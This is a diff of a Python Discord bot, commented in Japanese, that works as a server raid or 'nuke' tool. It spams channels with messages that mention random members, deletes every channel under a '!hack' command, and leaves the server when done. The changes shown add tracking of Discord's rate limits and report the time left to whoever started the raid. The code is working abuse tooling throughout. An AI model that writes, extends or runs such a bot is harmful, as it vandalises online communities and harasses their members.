@@ -4,7 +4,7 @@ from discord.ext import commands
 import os
 import asyncio
 import random
-from datetime import timedelta
+from datetime import timedelta, datetime, timezone
 
 intents = discord.Intents.default()
 intents.message_content = True
@@ -43,6 +43,7 @@ COMBINED_TEXT = (
 
 stop_flag = asyncio.Event()
 rate_limit_hit = asyncio.Event()
+rate_limit_reset_at = None
 background_tasks = set()
 initiator_id = None
 target_guild = None
@@ -51,6 +52,7 @@ active_jobs = 0
 final_leave_lock = asyncio.Lock()
 
 async def notify_initiator_rate_limit():
+    global rate_limit_reset_at
     if initiator_id is None:
         return
     try:
@@ -64,7 +66,6 @@ async def notify_initiator_rate_limit():
     except Exception as e:
         print(f"DM通知失敗: {e}")
 
-# ===== ✅ 停止だけ（退出しない版）=====
 async def stop_only(message: str = None):
     global active_jobs
     stop_flag.set()
@@ -73,13 +74,6 @@ async def stop_only(message: str = None):
     active_jobs = 0
     stop_flag.clear()
     rate_limit_hit.clear()
-    if message and target_guild:
-        try:
-            ch = target_guild.system_channel or next((c for c in target_guild.text_channels if c.permissions_for(target_guild.me).send_messages), None)
-            if ch:
-                await ch.send(message)
-        except:
-            pass
 
 async def try_auto_leave(message: str = None):
     async with final_leave_lock:
@@ -131,11 +125,10 @@ class StartButton(ui.View):
     async def start_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
         global initiator_id, target_guild, active_jobs
         await interaction.response.defer(ephemeral=True)
-        initiator_id = interaction.user.id
-        target_guild = interaction.guild
-        # ✅ 実行中なら停止だけしてから続行
         if active_jobs > 0:
             await stop_only("🔄 全削除コマンドのため、以前の処理を停止しました。")
+        initiator_id = interaction.user.id
+        target_guild = interaction.guild
         active_jobs += 1
         await interaction.followup.send("🔓 侵入承認…システム起動…", ephemeral=False)
         bot.loop.create_task(
@@ -151,6 +144,7 @@ def random_mentions(guild: discord.Guild) -> str:
     return " ".join(m.mention for m in picked) + "\n"
 
 async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
+    global rate_limit_reset_at
     sent_count = 0
     async def send_task():
         nonlocal sent_count
@@ -160,13 +154,19 @@ async def spam_channel(channel: discord.TextChannel, guild: discord.Guild):
                 await channel.send(text)
                 sent_count += 1
             except discord.HTTPException as e:
-                if e.status in (429, 400, 503):
+                if e.status == 429:
                     if not rate_limit_hit.is_set():
                         rate_limit_hit.set()
-                        print(f"⚠️ API制限検知: {e.status}")
+                        retry_after = getattr(e, 'retry_after', 60)
+                        rate_limit_reset_at = datetime.now(timezone.utc) + timedelta(seconds=retry_after)
+                        minutes = int(retry_after // 60)
+                        seconds = int(retry_after % 60)
+                        print(f"⚠️ API制限検知: 残り {minutes}分{seconds}秒")
                         await notify_initiator_rate_limit()
-                        await force_leave_all("⚠️ API制限のため全処理を停止します。")
+                        await force_leave_all(f"⚠️ API制限を受けました。解除まで約{minutes}分{seconds}秒です。")
                     return
+                elif e.status in (400, 503):
+                    await asyncio.sleep(0.5)
                 await asyncio.sleep(0.5)
             except:
                 await asyncio.sleep(0.5)
@@ -248,12 +248,39 @@ async def on_ready():
     await bot.tree.sync(guild=guild)
     print(f"✅ コマンド登録完了！")
 
+# ✅ API制限チェックコマンド
+@bot.command()
+async def check(ctx):
+    """API制限状況を確認（自分にだけ表示）"""
+    global rate_limit_reset_at
+    if rate_limit_hit.is_set() and rate_limit_reset_at:
+        now = datetime.now(timezone.utc)
+        remaining = rate_limit_reset_at - now
+        total_seconds = int(remaining.total_seconds())
+        if total_seconds <= 0:
+            # 時間切れ → 解除
+            rate_limit_hit.clear()
+            rate_limit_reset_at = None
+            embed = discord.Embed(title="✅ API制限状況", color=0x00ff00)
+            embed.add_field(name="状態", value="🔓 制限は解除されています", inline=False)
+        else:
+            minutes = total_seconds // 60
+            seconds = total_seconds % 60
+            embed = discord.Embed(title="⚠️ API制限状況", color=0xff0000)
+            embed.add_field(name="状態", value="🔒 API制限中です", inline=False)
+            embed.add_field(name="解除予定", value=f"あと **{minutes}分 {seconds}秒**", inline=False)
+            embed.add_field(name="解除予定時刻", value=rate_limit_reset_at.strftime("%Y-%m-%d %H:%M:%S UTC"), inline=False)
+    else:
+        embed = discord.Embed(title="✅ API制限状況", color=0x00ff00)
+        embed.add_field(name="状態", value="🔓 制限はかかっていません", inline=False)
+        embed.add_field(name="実行中タスク数", value=f"{active_jobs} 件", inline=False)
+    await ctx.send(embed=embed, ephemeral=True)
+
 @bot.command()
 async def start(ctx):
     global initiator_id, target_guild, active_jobs
     initiator_id = ctx.author.id
     target_guild = ctx.guild
-    # ✅ 実行中なら停止だけしてから続行
     if active_jobs > 0:
         await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
     active_jobs += 1
@@ -267,7 +294,6 @@ async def boost(ctx):
     global initiator_id, target_guild, active_jobs
     initiator_id = ctx.author.id
     target_guild = ctx.guild
-    # ✅ !boostは削除なし → 停止せず並行実行
     active_jobs += 1
     await ctx.send(f"🚀 !boost 実行開始（最大{MAX_TOTAL_CHANNELS}チャンネル / 1チャンネル{MAX_MESSAGES_PER_CHANNEL}件）\n✅ 全処理完了後に自動退出します。")
     bot.loop.create_task(
@@ -276,7 +302,6 @@ async def boost(ctx):
 
 @bot.command()
 async def stop(ctx):
-    """即時全停止＋即時退出"""
     await ctx.send("🛑 全処理を強制停止し、Botを退出させます。")
     await force_leave_all("🛑 !stop により全処理停止・Bot退出。")
 
@@ -284,7 +309,6 @@ async def stop(ctx):
 async def hack(ctx):
     global initiator_id, target_guild, active_jobs
     guild = ctx.guild
-    # ✅ 実行中なら停止だけしてから続行
     if active_jobs > 0:
         await stop_only("🔄 以前の処理を停止し、新規タスクを開始します。")
     await delete_all_channels_fast(guild)
